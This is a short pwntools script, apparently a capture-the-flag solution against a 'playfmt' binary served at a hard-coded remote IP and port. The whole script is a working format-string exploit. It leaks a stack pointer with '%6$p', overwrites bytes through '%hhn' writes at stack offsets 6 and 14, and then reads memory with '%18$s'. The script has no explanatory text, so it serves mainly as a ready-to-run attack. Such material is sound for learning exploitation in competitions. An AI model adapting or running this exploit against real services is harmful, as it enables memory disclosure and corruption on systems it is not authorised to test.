from pwn import *
context.log_level = 'debug'
# p = process("./playfmt")
p = remote("120.78.192.35", "9999")
p.recvuntil("=\n")
p.recvuntil("r\n")
p.recvuntil("=\n")
pause(2)
payload = "%6$p"
p.sendline(payload)
stack1 = int(p.recvuntil('\n', drop=True), 16)
print hex(stack1)
num = (stack1 & 0xff)+0x10
print hex(num)


payload = '%{}c%6$hhn'.format(num)

p.sendline(payload)
p.recv()
payload = '%16c%14$hhn'
p.sendline(payload)
p.recv()

payload = "%18$s"
p.sendline(payload)
p.recv()
